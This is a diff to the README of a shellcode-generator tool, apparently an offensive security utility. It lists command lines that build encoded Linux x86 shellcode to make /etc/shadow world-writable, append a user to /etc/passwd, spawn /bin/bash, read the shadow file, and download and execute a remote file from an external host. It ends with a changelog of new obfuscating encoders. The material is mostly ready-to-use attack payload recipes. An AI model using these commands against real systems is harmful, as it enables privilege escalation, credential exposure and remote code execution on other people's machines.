@@ -82,81 +82,66 @@ python shellcoder.py -types
 Generating shellcodes , using functions
 ----------------------------------------
 
-`python shellcoder.py -os linux_x86 -encode none -job chmod('/etc/shadow','777') -o file.txt`
+`python shellcoder.py -os linux_x86 -encode none -job "chmod('/etc/shadow','777')" -o file.txt`
 
-`python shellcoder.py -os linux_x86 -encode none -job write('/etc/passwd','user:pass') -o file.txt`
+`python shellcoder.py -os linux_x86 -encode xor_random -job "write('/etc/passwd','user:pass')" -o file.txt`
 
-`python shellcoder.py -os linux_x86 -encode none -job exec('/bin/bash') -o file.txt`
+`python shellcoder.py -os linux_x86 -encode xor_0x41414141 -job "exec('/bin/bash')" -o file.txt`
 
-Note: exec() doesn't support any ARGV same as exec('/bin/bash -c ls') or exec('/bin/bash','-c','ls'), you have to wait for next version and this feature will available  in system()
+`python shellcoder.py -os linux_x86 -encode sub_0x4f442c4d -job "system('ls')" -o file.txt`
 
-Note: Don't use space ' ' in system() function, replace it with "[space]" , software will detect and replace " " for you in shellcode.
+`python shellcoder.py -os linux_x86 -encode inc -job "system('ls[space]-la')" -o file.txt`
 
-`python shellcoder.py -os linux_x86 -encode none -job system('ls') -o file.txt`
+`python shellcoder.py -os linux_x86 -encode dec_10 -job "system('ls[space]-la[space]/etc/shadow;chmod[space]777[space]/etc/shadow;ls[space]-la[space]/etc/shadow;cat[space]/etc/shadow;wget[space]file[space];chmod[space]777[space]file;./file')" -o file.txt`
 
-`python shellcoder.py -os linux_x86 -encode none -job system('ls[space]-la') -o file.txt`
+`python shellcoder.py -os linux_x86 -encode add_random -job "file_create('/root/Desktop/hello.txt','hello')" -o file.txt`
 
-`python shellcoder.py -os linux_x86 -encode none -job system('ls[space]-la[space]/etc/shadow;chmod[space]777[space]/etc/shadow;ls[space]-la[space]/etc/shadow;cat[space]/etc/shadow;wget[space]file[space];chmod[space]777[space]file;./file') -o file.txt`
+`python shellcoder.py -os linux_x86 -encode dec_2 -job "file_create('/root/Desktop/hello2.txt','hello[space]world[space]!')" -o file.txt`
 
-`python shellcoder.py -os linux_x86 -encode none -job system('wget[space]file;sh[space]file') -o file.txt`
+`python shellcoder.py -os linux_x86 -encode mix_all -job "dir_create('/root/Desktop/mydirectory')" -o file.txt`
 
-`python shellcoder.py -os linux_x86 -encode none -job file_create('/root/Desktop/hello.txt','hello') -o file.txt`
+`python shellcoder.py -os linux_x86 -encode add_0x457f9f3d -job "download('http://www.z3r0d4y.com/exploit.type','myfile.type')" -o file.txt`
 
-`python shellcoder.py -os linux_x86 -encode none -job file_create('/root/Desktop/hello2.txt','hello[space]world[space]!') -o file.txt`
+`python shellcoder.py -os linux_x86 -encode mix_all -job "download_execute('http://www.z3r0d4y.com/exploit.type','myfile.type','./myfile.type')" -o file.txt`
 
-`python shellcoder.py -os linux_x86 -encode none -job dir_create('/root/Desktop/mydirectory') -o file.txt`
+Note: exec() doesn't support any ARGV same as `exec('/bin/bash -c ls')` or `exec('/bin/bash','-c','ls')`, you have to use `system()` function.
 
-`python shellcoder.py -os linux_x86 -encode none -job download('http://www.z3r0d4y.com/exploit.type','myfile.type') -o file.txt`
-
-`python shellcoder.py -os linux_x86 -encode none -job download_execute('http://www.z3r0d4y.com/exploit.type','myfile.type','./myfile.type') -o file.txt`
-
-multi command:
-
-`python shellcoder.py -os linux_x86 -encode none -job download_execute('http://www.z3r0d4y.com/exploit.type','myfile.type','chmod[space]777[space]myfile.type;sh[space]myfile.type') -o file.txt`
-
-`python shellcoder.py -os linux_x86 -encode none -job script_executor('script.type','D:\\myfile.type','./script.type') -o file.txt`
-
-`python shellcoder.py -os linux_x86 -encode none -job script_executor('z3r0d4y.sh','/root/z3r0d4y.sh','sh[space]z3r0d4y.sh') -o file.txt`
-
-`python shellcoder.py -os linux_x86 -encode none -job script_executor('ali.py','/root/Desktop/0day.py','chmod[space]+x[space]ali.py;[space]python[space]ali.py') -o file.txt`
-
-Note: Remember don't use " " and replace it with "[space]"
-
-Note: script_executor(),download_execute(),download(),dir_create(),file_create() are using linux command line , not the function. [wget,mkdir,echo]
-
-`python shellcoder.py -os linux_x86 -encode xor_random -job chmod('/etc/shadow','777') -o file.txt`
-
-`python shellcoder.py -os linux_x86 -encode xor_random -job chmod('/etc/passwd','444') -o file.txt`
-
-Note: each time you execute chmod() function with random encode, you are gonna get random outputs and different shellcode.
-
-`python shellcoder.py -os linux_x86 -encode xor_0x41414141 -job chmod('/etc/shadow','777') -o file.txt`
-
-`python shellcoder.py -os linux_x86 -encode xor_0x45872f4d -job chmod('/etc/passwd','444') -o file.txt`
-
-Note: your xor value could be anything. "xor_0x41414141" and "xor_0x45872f4d" are examples.
-
-`python shellcoder.py -os linux_x86 -encode add_random -job chmod('/etc/passwd','444') -o file.txt`
-
-`python shellcoder.py -os linux_x86 -encode add_0x41414141 -job chmod('/etc/passwd','777') -o file.txt`
-
-`python shellcoder.py -os linux_x86 -encode sub_random -job chmod('/etc/passwd','777') -o file.txt`
-
-`python shellcoder.py -os linux_x86 -encode sub_0x41414141 -job chmod('/etc/passwd','444') -o file.txt`
-
-`python shellcoder.py -os linux_x86 -encode inc -job chmod('/etc/passwd','777') -o file`
-
-`python shellcoder.py -os linux_x86 -encode dec -job chmod('/etc/passwd','777') -o file`
-
-`python shellcoder.py -os linux_x86 -encode inc_10 -job chmod('/etc/passwd','777') -o file`
-
-`python shellcoder.py -os linux_x86 -encode dec_30 -job chmod('/etc/passwd','777') -o file`
-
-Note: you also can use high value for inc and dec time, like inc_100000, your shellcode may get too big
+Note: Remember don't use `" "` and replace it with `"[space]"`
 
 
 Changes
 -------
+version 1.0.7: FT
+------------------
+
+
+ * add xor_yourvalue encoding in exec() [linux_x86]
+ * add add_yourvalue encoding in exec() [linux_x86]
+ * add sub_yourvalue encoding in exec() [linux_x86]
+ * add inc encoding in exec() [linux_x86]
+ * add inc_timesyouwant encoding in exec() [linux_x86]
+ * add dec encoding in exec() [linux_x86]
+ * add dec_timesyouwant encoding in exec() [linux_x86]
+ * add mic_all encoding in exec() [linux_x86]
+ * add xor_yourvalue encoding in write() [linux_x86] 
+ * add add_yourvalue encoding in write() [linux_x86] 
+ * add sub_yourvalue encoding in write() [linux_x86]
+ * add inc encoding in write() [linux_x86]
+ * add inc_timesyouwant encoding in write() [linux_x86]
+ * add dec encoding in write() [linux_x86]
+ * add dec_timesyouwant encoding in write() [linux_x86]
+ * add mic_all encoding in write() [linux_x86]
+ * fixed xor_random encoding in write() [linux_x86]
+ * fixed add_random encoding in write() [linux_x86]
+ * fixed sub_random encoding in write() [linux_x86]
+ * fixed dec_timesyouwant encoding in file_create() [linux_x86]
+ * fixed dec_timesyouwant encoding in dir_create() [linux_x86]
+ * fixed dec_timesyouwant encoding in download() [linux_x86]
+ * fixed dec_timesyouwant encoding in download_execute() [linux_x86]
+ * fixed dec_timesyouwant encoding in script_executor() [linux_x86]
+ * Optimized software engine and shellcode generators
+
+
 version 1.0.6: B2018
 ------------------
 
